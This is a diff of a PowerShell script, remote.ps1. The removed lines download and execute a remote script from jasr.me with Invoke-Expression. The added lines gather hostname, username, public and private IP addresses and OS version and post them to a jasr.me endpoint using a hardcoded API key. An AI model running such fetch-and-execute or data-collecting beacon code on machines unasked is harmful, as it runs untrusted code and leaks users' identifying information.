@@ -1,12 +1,29 @@
 # remote.ps1
-$url2 = "http://jasr.me/code/remote1.ps1"
+# Collect basic system information and send it to the jasr.me receiver.
+# The API key must match private/config.php on the server.
 
-# Download and execute remote1.ps1 directly
-Invoke-Expression (Invoke-WebRequest -Uri $url2).Content
+$endpoint = "https://jasr.me/code/receive.php"
+$apiKey = "R9vK2mQ7xL4pN8sW3cT6yH1zB5dF0gJ2"
 
-# Optionally, download remote1.ps1 to disk for inspection and manual execution
-$path = "C:\temp\remote1.ps1"
-$client = New-Object System.Net.WebClient
-$client.DownloadFile($url2, $path)
+$privateIp = Get-NetIPAddress -AddressFamily IPv4 |
+    Where-Object {
+        $_.IPAddress -notlike "127.*" -and
+        $_.IPAddress -notlike "169.254.*" -and
+        $_.AddressState -eq "Preferred"
+    } |
+    Select-Object -First 1 -ExpandProperty IPAddress
 
-Write-Output "remote1.ps1 has been saved to $path. You can inspect and run it manually if needed."
+$payload = @{
+    PublicIPAddress  = (Invoke-RestMethod -Uri "https://api.ipify.org")
+    OSVersion        = (Get-CimInstance -ClassName Win32_OperatingSystem).Version
+    Hostname         = $env:COMPUTERNAME
+    PrivateIPAddress = $privateIp
+    Username         = $env:USERNAME
+} | ConvertTo-Json -Compress
+
+Invoke-RestMethod `
+    -Uri $endpoint `
+    -Method Post `
+    -Headers @{ "X-API-Key" = $apiKey } `
+    -ContentType "application/json" `
+    -Body $payload
